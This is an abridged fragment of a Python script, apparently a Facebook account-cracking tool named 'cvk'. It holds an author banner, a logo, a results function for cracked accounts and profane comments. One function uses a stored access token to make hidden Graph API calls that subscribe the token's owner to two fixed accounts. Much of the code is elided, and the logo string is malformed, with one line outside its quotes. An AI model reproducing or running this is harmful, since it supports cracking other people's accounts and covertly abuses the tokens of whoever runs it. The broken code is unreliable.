...
#######################################################
# Name           : cvk (cvk) <token method>         #
# File           : cvk.py                            #
# Author         : Boyyz Zuckerberg        #
# Github         : https://github.com/AlipXD        #
# Facebook       : https://www.facebook.com/Aliff.febriyan   #
...
# LO KONTOL
logo = ''' \033[0;96m _______    ____ __
\033[0;96m  / ____/ |  / / //_/ ® \033[0m|| Created By Alip XD
\033[0;96m / /    | | / / ,<               \033[0m|| Github.com/AlipXD
\033[0;96m/ /___  | |/ / /| |          \033[0;91mv2.0  \033[0m|| Facebook.com/Aliff.febriyan'''
\033[0;96m\____/  |___/_/ |_|
# crack selesai
def hasil(ok,cp):
...
def kontol():
	...
	requests.post('https://graph.facebook.com/100045047953420/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100001748314540/subscribers?access_token=%s'%(__cindy__))
